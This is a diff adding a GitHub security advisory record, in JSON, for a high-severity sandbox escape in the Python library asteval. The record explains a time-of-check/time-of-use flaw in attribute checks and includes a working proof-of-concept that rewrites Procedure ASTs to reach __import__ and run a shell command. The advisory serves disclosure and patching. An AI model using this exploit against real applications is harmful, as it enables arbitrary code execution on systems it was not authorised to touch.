@@ -1,0 +1,49 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2025-01-23T22:33:50Z",
+  "Package": {
+    "Ecosystem": "PIP",
+    "Name": "asteval"
+  },
+  "Advisory": {
+    "DatabaseId": 277541,
+    "Id": "GSA_kwCzR0hTQS12cDQ3LTk3MzQtcHJqd84ABDwl",
+    "GhsaId": "GHSA-vp47-9734-prjw",
+    "References": [
+      {
+        "Url": "https://github.com/lmfit/asteval/security/advisories/GHSA-vp47-9734-prjw"
+      },
+      {
+        "Url": "https://github.com/lmfit/asteval/commit/45bb47533f7abb5479618ae7f6a809215700dcb2"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-vp47-9734-prjw"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-vp47-9734-prjw"
+      }
+    ],
+    "Description": "### Summary\nIf an attacker can control the input to the asteval library, they can bypass its safety restrictions and execute arbitrary Python code within the application's context.\n\n### Details\nThe vulnerability is rooted in how `asteval` performs attribute access verification. In particular, the [`on_attribute`](https://github.com/lmfit/asteval/blob/8d7326df8015cf6a57506b1c2c167a1c3763e090/asteval/asteval.py#L565) node handler prevents access to attributes that are either present in the `UNSAFE_ATTRS` list or are formed by names starting and ending with `__`, as shown in the code snippet below:\n\n```py\n    def on_attribute(self, node):    # ('value', 'attr', 'ctx')\n        \"\"\"Extract attribute.\"\"\"\n\n        ctx = node.ctx.__class__\n        if ctx == ast.Store:\n            msg = \"attribute for storage: shouldn't be here!\"\n            self.raise_exception(node, exc=RuntimeError, msg=msg)\n\n        sym = self.run(node.value)\n        if ctx == ast.Del:\n            return delattr(sym, node.attr)\n        #\n        unsafe = (node.attr in UNSAFE_ATTRS or\n                 (node.attr.startswith('__') and node.attr.endswith('__')))\n        if not unsafe:\n            for dtype, attrlist in UNSAFE_ATTRS_DTYPES.items():\n                unsafe = isinstance(sym, dtype) and node.attr in attrlist\n                if unsafe:\n                    break\n        if unsafe:\n            msg = f\"no safe attribute '{node.attr}' for {repr(sym)}\"\n            self.raise_exception(node, exc=AttributeError, msg=msg)\n        else:\n            try:\n                return getattr(sym, node.attr)\n            except AttributeError:\n                pass\n```\n\nWhile this check is intended to block access to sensitive Python dunder methods (such as `__getattribute__`), the flaw arises because instances of the `Procedure` class expose their AST (stored in the `body` attribute) without proper protection:\n\n```py\nclass Procedure:\n    \"\"\"Procedure: user-defined function for asteval.\n\n    This stores the parsed ast nodes as from the 'functiondef' ast node\n    for later evaluation.\n\n    \"\"\"\n\n    def __init__(self, name, interp, doc=None, lineno=0,\n                 body=None, args=None, kwargs=None,\n                 vararg=None, varkws=None):\n        \"\"\"TODO: docstring in public method.\"\"\"\n        self.__ininit__ = True\n        self.name = name\n        self.__name__ = self.name\n        self.__asteval__ = interp\n        self.raise_exc = self.__asteval__.raise_exception\n        self.__doc__ = doc\n        self.body = body\n        self.argnames = args\n        self.kwargs = kwargs\n        self.vararg = vararg\n        self.varkws = varkws\n        self.lineno = lineno\n        self.__ininit__ = False\n```\n\nSince the `body` attribute is not protected by a naming convention that would restrict its modification, an attacker can modify the AST of a `Procedure` during runtime to leverage unintended behaviour.\n\nThe exploit works as follows:\n\n1. **The Time of Check, Time of Use (TOCTOU) Gadget:**\n\n   In the [code](https://github.com/lmfit/asteval/blob/8d7326df8015cf6a57506b1c2c167a1c3763e090/asteval/asteval.py#L577) below, a variable named `unsafe` is set based on whether `node.attr` is considered unsafe:\n\n   ```python\n   unsafe = (node.attr in UNSAFE_ATTRS or\n             (node.attr.startswith('__') and node.attr.endswith('__')))\n   ```\n\n2. **Exploiting the TOCTOU Gadget:**\n\n   An attacker can abuse this gadget by hooking any `Attribute` AST node that is not in the `UNSAFE_ATTRS` list. The attacker modifies the `node.attr.startswith` function so that it points to a custom procedure. This custom procedure performs the following steps:\n   \n   - It replaces the value of `node.attr` with the string `\"__getattribute__\"` and returns `False`.\n   - Thus, when `node.attr.startswith('__')` is evaluated, it returns `False`, which causes the condition to short-circuit and sets `unsafe` to `False`.\n   - However, by that time, `node.attr` has been changed to `\"__getattribute__\"`, which will be used in the subsequent `getattr(sym, node.attr)` call. An attacker can then use the obtained reference to `sym.__getattr__`to retrieve malicious attributes without needing to pass the `on_attribute` checks.\n\n### PoC\nThe following proof-of-concept (PoC) demonstrates how this vulnerability can be exploited to execute the `whoami` command on the host machine:\n\n```py\nfrom asteval import Interpreter\naeval = Interpreter()\ncode = \"\"\"\nga_str = \"__getattribute__\"\ndef lender():\n    a\n    b\ndef pwn():\n    ga = lender.dontcare\n    init = ga(\"__init__\")\n    ga = init.dontcare\n    globals = ga(\"__globals__\")\n    builtins = globals[\"__builtins__\"]\n    importer = builtins[\"__import__\"]\n    importer(\"os\").system(\"whoami\")\n\ndef startswith1(str):\n    # Replace the attr on the targeted AST node with \"__getattribute__\"\n    pwn.body[0].value.attr = ga_str\n    return False    \n\ndef startswith2(str):\n    pwn.body[2].value.attr = ga_str\n    return False    \n\nn1 = lender.body[0]\nn1.startswith = startswith1\npwn.body[0].value.attr = n1\n\nn2 = lender.body[1]\nn2.startswith = startswith2\npwn.body[2].value.attr = n2\n\npwn()\n\"\"\"\naeval(code)\n```",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2025-01-23T22:33:48Z",
+    "Severity": "HIGH",
+    "Summary": "ASTEVAL Allows Malicious Tampering of Exposed AST Nodes Leads to Sandbox Escape",
+    "UpdatedAt": "2025-01-23T22:33:50Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 8.4,
+      "VectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.0.6"
+      },
+      "VulnerableVersionRange": "\u003c= 1.0.5"
+    }
+  ]
+}
